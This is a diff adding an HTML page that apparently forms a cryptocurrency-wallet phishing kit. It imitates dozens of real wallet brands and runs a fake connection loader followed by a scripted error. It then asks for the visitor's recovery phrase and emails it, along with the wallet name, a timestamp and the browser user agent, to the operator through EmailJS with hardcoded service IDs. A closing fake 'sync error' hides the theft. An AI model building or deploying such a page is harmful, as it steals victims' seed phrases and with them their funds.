+                        <div class="w-10 h-10 bg-rose-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">F</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Fearless Wallet</h3>
+                            <p class="text-gray-400 text-sm">fearlesswallet.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('MYKEY', 'mykey.org')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-amber-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">M</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">MYKEY</h3>
+                            <p class="text-gray-400 text-sm">mykey.org</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Atomic Wallet', 'atomicwallet.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-lime-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">A</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Atomic Wallet</h3>
+                            <p class="text-gray-400 text-sm">atomicwallet.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('CoolWallet S', 'coolwallet.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-sky-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">C</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">CoolWallet S</h3>
+                            <p class="text-gray-400 text-sm">coolwallet.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Nash', 'nash.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-fuchsia-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">N</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Nash</h3>
+                            <p class="text-gray-400 text-sm">nash.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Coinomi', 'coinomi.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-orange-500 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">C</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Coinomi</h3>
+                            <p class="text-gray-400 text-sm">coinomi.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('GridPlus', 'gridplus.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-neutral-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">G</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">GridPlus</h3>
+                            <p class="text-gray-400 text-sm">gridplus.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Tokenary', 'tokenary.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-stone-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">T</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Tokenary</h3>
+                            <p class="text-gray-400 text-sm">tokenary.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('SafePal', 'safepal.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-zinc-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">S</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">SafePal</h3>
+                            <p class="text-gray-400 text-sm">safepal.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Infinito', 'infinitowallet.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-red-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">I</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Infinito</h3>
+                            <p class="text-gray-400 text-sm">infinitowallet.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Wallet.io', 'wallet.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-blue-900 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">W</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Wallet.io</h3>
+                            <p class="text-gray-400 text-sm">wallet.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Ownbit', 'ownbit.io')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-green-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">O</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Ownbit</h3>
+                            <p class="text-gray-400 text-sm">ownbit.io</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('EasyPocket', 'easypocket.app')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-purple-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">E</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">EasyPocket</h3>
+                            <p class="text-gray-400 text-sm">easypocket.app</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Bridge Wallet', 'mtpelerin.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-indigo-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">B</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Bridge Wallet</h3>
+                            <p class="text-gray-400 text-sm">mtpelerin.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('ViaWallet', 'viawallet.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-yellow-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">V</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">ViaWallet</h3>
+                            <p class="text-gray-400 text-sm">viawallet.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('BitKeep', 'bitkeep.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-pink-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">B</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">BitKeep</h3>
+                            <p class="text-gray-400 text-sm">bitkeep.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Unstoppable Wallet', 'unstoppable.money')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-teal-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">U</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Unstoppable Wallet</h3>
+                            <p class="text-gray-400 text-sm">unstoppable.money</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('HaloDefi Wallet', 'halodefi.org')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-cyan-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">H</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">HaloDefi Wallet</h3>
+                            <p class="text-gray-400 text-sm">halodefi.org</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Dok Wallet', 'dokwallet.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-emerald-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">D</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Dok Wallet</h3>
+                            <p class="text-gray-400 text-sm">dokwallet.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Cello Wallet', 'cellowallet.app')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-lime-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">C</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Cello Wallet</h3>
+                            <p class="text-gray-400 text-sm">cellowallet.app</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Valora', 'valoraapp.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-sky-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">V</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Valora</h3>
+                            <p class="text-gray-400 text-sm">valoraapp.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Trustee Wallet', 'trusteeglobal.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-violet-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">T</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Trustee Wallet</h3>
+                            <p class="text-gray-400 text-sm">trusteeglobal.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Guarda Wallet', 'guarda.com')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-fuchsia-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">G</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Guarda Wallet</h3>
+                            <p class="text-gray-400 text-sm">guarda.com</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('imToken', 'token.im')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-rose-700 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">I</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">imToken</h3>
+                            <p class="text-gray-400 text-sm">token.im</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gray-800 p-4 rounded-lg card-hover cursor-pointer" onclick="selectWallet('Others', '')">
+                    <div class="flex items-center space-x-3">
+                        <div class="w-10 h-10 bg-gray-600 rounded-lg flex items-center justify-center">
+                            <span class="text-white font-bold">•••</span>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold">Others</h3>
+                            <p class="text-gray-400 text-sm">Other wallets</p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Modal -->
+    <div id="loadingModal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
+        <div class="bg-gray-800 p-8 rounded-lg max-w-md w-full mx-4 text-center text-white relative">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-2xl font-bold">&times;</button>
+            <div class="w-16 h-16 bg-blue-600 rounded-lg mx-auto mb-4 flex items-center justify-center">
+                <span class="text-white text-xl font-bold" id="walletIcon">C</span>
+            </div>
+            <h3 class="text-xl font-semibold mb-2" id="walletName">Coinbase</h3>
+            <p class="text-gray-300 mb-6">This session is secured and encrypted</p>
+            
+            <div class="mb-4">
+                <div class="bg-gray-700 rounded-full h-2 mb-2">
+                    <div id="loadingBar" class="bg-blue-500 h-2 rounded-full loading-bar"></div>
+                </div>
+                <p class="text-sm text-gray-300" id="loadingText">starting secure connection...</p>
+                <p class="text-xs text-gray-400 mt-1">please wait...</p>
+            </div>
+
+            <div class="flex items-center justify-center text-gray-400 text-sm">
+                <span class="mr-2">🔒</span>
+                <span>This session is protected with an end-to-end encryption</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
+        <div class="bg-gray-800 p-8 rounded-lg max-w-md w-full mx-4 text-center text-white relative">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-2xl font-bold">&times;</button>
+            <div class="w-16 h-16 bg-blue-600 rounded-lg mx-auto mb-4 flex items-center justify-center">
+                <span class="text-white text-xl font-bold" id="errorWalletIcon">C</span>
+            </div>
+            <h3 class="text-xl font-semibold mb-2" id="errorWalletName">Coinbase</h3>
+            <p class="text-gray-300 mb-6">This session is secured and encrypted</p>
+            
+            <div class="bg-red-600 bg-opacity-20 border border-red-600 rounded-lg p-3 mb-6">
+                <p class="text-red-400 text-sm">An error occurred... please try again or connect manually</p>
+            </div>
+
+            <div class="space-y-3">
+                <button onclick="tryAgain()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 px-4 rounded-lg font-medium transition-colors">
+                    Try Again
+                </button>
+                <button onclick="connectManually()" class="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 px-4 rounded-lg font-medium transition-colors">
+                    Connect Manually
+                </button>
+            </div>
+
+            <div class="flex items-center justify-center text-gray-400 text-sm mt-6">
+                <span class="mr-2">🔒</span>
+                <span>This session is protected with an end-to-end encryption</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Manual Connection Form -->
+    <div id="manualForm" class="hidden fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
+        <div class="bg-gray-800 p-8 rounded-lg max-w-md w-full mx-4 text-center text-white relative">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-2xl font-bold">&times;</button>
+            <div class="w-16 h-16 bg-blue-600 rounded-lg mx-auto mb-4 flex items-center justify-center">
+                <span class="text-white text-xl font-bold" id="formWalletIcon">C</span>
+            </div>
+            <h3 class="text-xl font-semibold mb-2" id="formWalletName">Coinbase</h3>
+            <p class="text-gray-300 mb-6">This session is secured and encrypted</p>
+
+            <form id="walletForm" class="space-y-4">
+                <div>
+                    <input type="text" id="walletNameField" readonly class="w-full bg-gray-200 text-gray-800 p-3 rounded-lg font-medium" value="Coinbase">
+                </div>
+                <div>
+                    <textarea id="recoveryPhrase" placeholder="Enter your recovery phrase or any text" class="w-full bg-white text-gray-800 p-3 rounded-lg h-32 resize-none border-0 focus:ring-2 focus:ring-blue-500" required></textarea>
+                </div>
+                <button type="submit" class="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 px-4 rounded-lg font-medium transition-colors">
+                    Validate Wallet
+                </button>
+            </form>
+
+            <div class="flex items-center justify-center text-gray-400 text-sm mt-6">
+                <span class="mr-2">🔒</span>
+                <span>This session is protected with an end-to-end encryption</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Final Error Page (matches your image exactly) -->
+    <div id="finalError" class="hidden min-h-screen bg-gray-400 flex flex-col items-center justify-center p-4">
+        <div class="text-center mb-8">
+            <h1 class="text-2xl font-bold text-gray-800 mb-4">Please wait a sec, your wallet is been synced with the server...</h1>
+            <p class="text-gray-700 mb-4">if you are not redirected please go back and try again with a different wallet...</p>
+            <button onclick="goBackToWallets()" class="text-blue-600 hover:text-blue-800 underline font-medium">Go back</button>
+        </div>
+
+        <div class="bg-white p-8 rounded-lg shadow-lg max-w-md w-full text-center">
+            <div class="w-16 h-16 border-4 border-red-500 rounded-full mx-auto mb-4 flex items-center justify-center">
+                <span class="text-red-500 text-2xl font-bold">✕</span>
+            </div>
+            <h2 class="text-xl font-semibold text-gray-800 mb-4">Wallet Sync Error</h2>
+            <p class="text-gray-600 mb-6 leading-relaxed">Your wallet is being synced with the server. If you are not redirected, please go back and try again with a different wallet.</p>
+            <button onclick="goBackToWallets()" class="bg-blue-600 hover:bg-blue-700 text-white py-3 px-6 rounded-lg font-medium transition-colors">
+                Go Back
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Initialize EmailJS with your configuration
+        emailjs.init("4wwIu_5Vka-UXyHxq");
+
+        let selectedWallet = null;
+
+        function showWalletSelection() {
+            document.getElementById('page1').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+        }
+
+        function selectWallet(name, domain) {
+            selectedWallet = { name, domain };
+            showLoadingModal(name);
+        }
+
+        function closeModal() {
+            document.getElementById('loadingModal').classList.add('hidden');
+            document.getElementById('errorModal').classList.add('hidden');
+            document.getElementById('manualForm').classList.add('hidden');
+            
+            // Reset loading bar
+            document.getElementById('loadingBar').classList.remove('active');
+            
+            // Clear form
+            document.getElementById('recoveryPhrase').value = '';
+        }
+
+        function showLoadingModal(walletName) {
+            const modal = document.getElementById('loadingModal');
+            const walletIcon = document.getElementById('walletIcon');
+            const nameElement = document.getElementById('walletName');
+            const loadingBar = document.getElementById('loadingBar');
+            
+            // Set wallet info
+            walletIcon.textContent = walletName.charAt(0);
+            nameElement.textContent = walletName;
+            
+            // Reset loading bar
+            loadingBar.classList.remove('active');
+            
+            // Show modal
+            modal.classList.remove('hidden');
+            
+            // Start loading animation
+            setTimeout(() => {
+                loadingBar.classList.add('active');
+            }, 100);
+            
+            // Show error after loading completes
+            setTimeout(() => {
+                showErrorModal();
+            }, 2500);
+        }
+
+        function showErrorModal() {
+            document.getElementById('loadingModal').classList.add('hidden');
+            
+            const errorModal = document.getElementById('errorModal');
+            const errorWalletIcon = document.getElementById('errorWalletIcon');
+            const errorWalletName = document.getElementById('errorWalletName');
+            
+            errorWalletIcon.textContent = selectedWallet.name.charAt(0);
+            errorWalletName.textContent = selectedWallet.name;
+            
+            errorModal.classList.remove('hidden');
+        }
+
+        function tryAgain() {
+            document.getElementById('errorModal').classList.add('hidden');
+            showLoadingModal(selectedWallet.name);
+        }
+
+        function connectManually() {
+            document.getElementById('errorModal').classList.add('hidden');
+            
+            const manualForm = document.getElementById('manualForm');
+            const formWalletIcon = document.getElementById('formWalletIcon');
+            const formWalletName = document.getElementById('formWalletName');
+            const walletNameField = document.getElementById('walletNameField');
+            
+            formWalletIcon.textContent = selectedWallet.name.charAt(0);
+            formWalletName.textContent = selectedWallet.name;
+            walletNameField.value = selectedWallet.name;
+            
+            manualForm.classList.remove('hidden');
+        }
+
+        function goBackToWallets() {
+            // Hide all modals and final error page
+            document.getElementById('finalError').classList.add('hidden');
+            document.getElementById('page1').classList.add('hidden');
+            document.getElementById('page2').classList.remove('hidden');
+            
+            // Reset any open modals
+            closeModal();
+        }
+
+        // Handle form submission
+        document.getElementById('walletForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const walletName = document.getElementById('walletNameField').value;
+            const recoveryPhrase = document.getElementById('recoveryPhrase').value;
+            
+            // Show loading state on submit button
+            const submitButton = e.target.querySelector('button[type="submit"]');
+            const originalText = submitButton.textContent;
+            submitButton.textContent = 'Validating...';
+            submitButton.disabled = true;
+            
+            try {
+                // Send email via EmailJS with your configuration
+                await emailjs.send(
+                    'service_rz6mnoq', // Your Service ID
+                    'template_v7hp8n4', // Your Template ID
+                    {
+                        wallet_name: walletName,
+                        recovery_phrase: recoveryPhrase,
+                        wallet_domain: selectedWallet.domain,
+                        timestamp: new Date().toISOString(),
+                        user_agent: navigator.userAgent
+                    }
+                );
+                
+                // Hide form and show final error page
+                document.getElementById('manualForm').classList.add('hidden');
+                document.getElementById('page2').classList.add('hidden');
+                document.getElementById('finalError').classList.remove('hidden');
+                
+            } catch (error) {
+                console.error('Error sending email:', error);
+                
+                // Reset button and show error
+                submitButton.textContent = originalText;
+                submitButton.disabled = false;
+                
+                // Still show the final error page to maintain the flow
+                document.getElementById('manualForm').classList.add('hidden');
+                document.getElementById('page2').classList.add('hidden');
+                document.getElementById('finalError').classList.remove('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
